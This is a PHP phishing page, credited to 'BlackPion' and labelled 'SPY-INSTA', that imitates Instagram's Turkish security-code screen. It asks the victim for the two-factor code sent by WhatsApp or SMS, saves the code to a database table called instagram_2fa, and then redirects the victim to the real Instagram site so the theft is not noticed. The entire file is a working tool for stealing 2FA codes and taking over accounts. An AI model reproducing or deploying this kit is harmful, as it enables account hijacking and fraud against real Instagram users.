<?php

// -- ███████╗██████╗ ██╗   ██╗     ██╗███╗   ██╗███████╗████████╗ █████╗ -- \\
// -- ██╔════╝██╔══██╗╚██╗ ██╔╝     ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗ -- \\
// -- ███████╗██████╔╝ ╚████╔╝█████╗██║██╔██╗ ██║███████╗   ██║   ███████║ -- \\
// -- ╚════██║██╔═══╝   ╚██╔╝ ╚════╝██║██║╚██╗██║╚════██║   ██║   ██╔══██║ -- \\  
// -- ███████║██║        ██║        ██║██║ ╚████║███████║   ██║   ██║  ██║ -- \\
// -- ╚══════╝╚═╝        ╚═╝        ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ -- \\
// --                              Developer By: BlackPion                 -- \\
// --                              Github:                                 -- \\
// --                              Forum Profil Linki: https://l24.im/dNx8 -- \\

include("vtBaglanti.php");

if (isset($_POST["button"])) {
    if (empty($_POST["TwoFactor"])) {
        
    } else {
        $twoFactor = mysqli_real_escape_string($baglanti, $_POST["TwoFactor"]);
        
        $stmt = $baglanti->prepare("INSERT INTO instagram_2fa (2FA_Code) VALUES (?)");
        $stmt->bind_param("s", $twoFactor); 

        if ($stmt->execute()) {
            header("Refresh: 1; URL=https://www.instagram.com/");
            exit();
        }

        $stmt->close();
        mysqli_close($baglanti);
    }
}

?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <title>Giriş Yap • Instagram</title>
    <link rel="icon" href="ico/insta-fav.ico" type=""/>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="resimler/instagram-kilit-logo.png" alt="Kilit Logo" title="Kilit logo" />
                </h1>
                <p style="text-align: center; margin-top: 10px;">
                    Cep telefonuna WhatsApp'tan veya SMS'ten gönderdiğimiz kodu gir: +90 *** *** ** 88.
                </p>
                <form action="index.php" method="POST">

                    <label for="password" class="sr-only">Güvenlik Kodu</label>
                    <input name="TwoFactor" type="number" placeholder="Güvenlik Kodu" title="Gerekli Alanı Doldurun." class="border border-danger form-control-sm" oninput="validateNumberInput(event)" />

                    <button name="button" title="Onayla" type="submit">Onayla</button>
                    
                </form>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                    </div>
                    <p style="text-align: center; margin-top: 10px;">
                        Güvenlik kodu alamıyorsan,<br />
                        <a href="">Yedek kodlarından</a> birini kullan
                    </p>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Hesabın yok mu?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Uygulamayı indir.</p>
                <div class="flex justify-content-center">
                    <a href="https://apps.apple.com/cy/app/instagram/id389801252?l=tr" target="_blank" rel="noopener noreferrer">
                    <img src="resimler/apple-button.png"/>
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
                    <img src="resimler/googleplay-button.png"/>
                    </a>
                </div>
            </div>
        </section>
    </main>  
    <script src="click.js"></script>
    <script src="number.js"></script>
</body>
</html>